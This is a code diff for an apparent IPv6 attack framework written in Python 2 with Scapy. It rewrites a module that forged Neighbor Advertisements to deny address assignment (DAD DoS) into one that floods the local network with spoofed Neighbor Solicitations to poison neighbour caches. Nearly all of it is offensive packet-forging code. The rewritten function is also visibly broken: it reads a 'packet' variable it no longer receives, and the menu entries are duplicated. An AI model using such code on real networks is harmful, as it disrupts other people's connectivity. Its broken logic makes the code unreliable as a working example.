@@ -11,19 +11,18 @@ class IPv6Module(Template):
 
     def __init__(self, socketio, namespace):
         super(IPv6Module, self).__init__(socketio, namespace)
-        self.modname = "DAD DoS"
+        self.modname = "ND Cache Poisoning"
         self.actions = [
             {
-                "title": "DAD DoS",
-                "action": "action",
-                "target": True
-            },
-            {
-                "title": "Start DAD DoS",
+                "title": "ND Cache Poisoning",
                 "action": "action"
             },
             {
-                "title": "Stop DAD DoS",
+                "title": "ND Cache Poisoning",
+                "action": "action"
+            },
+            {
+                "title": "Stop ND Cache Poisoning",
                 "action": "stop_sniffer"
             }
         ]
@@ -52,16 +51,13 @@ class IPv6Sniffer:
         print("sniffer intialized")
         self.stopped = False
         self.pool = ThreadPool(processes=1)
-        self.pool.apply_async(self.listen)
+        self.pool.apply_async(self.send)
         # self.listen()
 
     # start the listener
-    def listen(self):
-        res = sniff(lfilter=lambda (packet): IPv6 in packet,
-                    prn=lambda (packet): self.callback(packet),
-                    stop_filter=self.stopfilter,
-                    store=0)
-        return res
+    def send(self):
+        while True:
+            self.cache_poison()
 
     # stop the listener
     def stop(self):
@@ -81,33 +77,34 @@ class IPv6Sniffer:
         if ICMPv6ND_NS in packet:
             channel = 'module_output'
             try:
-                self.DAD_DoS(packet)
+                self.cache_poison(packet)
             except Exception,e:
                 exc_info = sys.exc_info()
                 traceback.print_exception(*exc_info)
                 #print e
 
-    def DAD_DoS(self, packet,target=None, src=None, dst=get_source_address(IPv6(dst="ff02::1"))):
+    def cache_poison(self, dst=get_source_address(IPv6(dst="ff02::1"))):
+        import random   
+        M = 16**4
+        src = "fe80:" + ":".join(("%x" % random.randint(0, M) for i in range(6)))
+        lladdr = getMacAddress(src)
+
         ip_packet = createIPv6()
         ip_packet.fields["nh"] = 58 #ICMPv6
         ip_packet.fields["hlim"] = 255
+        ip_packet.fields["src"] = src
         ip_packet.fields["dst"] = dst
-
-        if packet[IPv6].src != "::":
-            ip_packet.fields["dst"] = packet[IPv6].src
-
 
         tgt = packet[ICMPv6ND_NS].fields["tgt"]
 
-        advertisement = ICMPv6ND_NA()
-        advertisement.fields["R"] = 0
-        advertisement.fields["S"] = 1
-        advertisement.fields["O"] = 1
+        solicitation = ICMPv6ND_NS()
+        solicitation.fields["tgt"] = src
         
         options = ICMPv6NDOptSrcLLAddr()
-        options.fields["lladdr"] = [get_if_hwaddr(i) for i in get_if_list()][0]
+        options.fields["lladdr"] = lladdr
 
-        send(ip_packet/advertisement/options)
-        out = "DAD_DoS: Overriding IPv6 Neighbor Solicitation: %s  Packet sent to %s" % (tgt)
+        # TODO: Add continuous sending of this packet
+        out = "ND_Cache: Poisoning Started"
+        send(ip_packet/solicitation/options)
         self.mod.socket_log(out)
         print out
